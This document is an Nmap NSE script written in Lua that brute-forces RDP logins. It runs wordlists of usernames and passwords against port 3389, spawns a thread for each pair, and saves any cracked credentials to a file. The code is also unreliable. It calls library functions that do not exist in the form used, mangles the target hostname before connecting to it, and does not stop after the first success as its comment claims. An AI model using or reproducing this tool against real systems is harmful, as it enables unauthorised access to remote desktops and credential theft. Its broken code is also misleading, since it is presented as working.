-- rdp-brute-parallel-save.nse
description = [[
  Attempts to guess username/password combinations over RDP in parallel on a list of IPs, with hostname sanitization and result saving.
]]

author = "Your Name"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"intrusive", "brute"}

local rdp = require "rdp"
local shortport = require "shortport"
local creds = require "creds"
local stdnse = require "stdnse"
local nmap = require "nmap"

portrule = shortport.port_or_service(3389, "ms-wbt-server")

-- Function to sanitize hostnames
local function sanitize_hostname(hostname)
  -- Replace illegal characters with '*'
  return (hostname:gsub("[^%w%-%.]", "*"))
end

action = function(host, port)
  local results = {}
  local sanitized_host = sanitize_hostname(host.targetname)
  local username_list = nmap.registry.args.userdb or "usernames.txt"
  local password_list = nmap.registry.args.passdb or "passwords.txt"
  local output_file = nmap.registry.args.output or "rdp_brute_results.txt"
  
  local usernames = creds.Usernames.new(username_list)
  local passwords = creds.Passwords.new(password_list)

  -- Table to hold coroutine threads
  local threads = {}

  for username in usernames:next() do
    for password in passwords:next() do
      -- Create a coroutine for each username/password combination
      local thread = stdnse.new_thread(function()
        local status, err = rdp.connect(sanitized_host, port, username, password)
        if status then
          stdnse.print_debug("Success: %s:%s", username, password)
          table.insert(results, "Success: " .. sanitized_host .. ":" .. username .. ":" .. password)
          return results -- Exit after first success
        else
          stdnse.print_debug("Failed: %s:%s", username, password)
        end
      end)
      table.insert(threads, thread)
    end
  end

  -- Run all coroutines in parallel
  stdnse.run_parallel(threads)

  -- Save results to file
  if #results > 0 then
    local file = io.open(output_file, "a")
    if file then
      for _, result in ipairs(results) do
        file:write(result .. "\n")
      end
      file:close()
    else
      stdnse.print_debug("Failed to open file: %s", output_file)
    end
  end

  return results
end
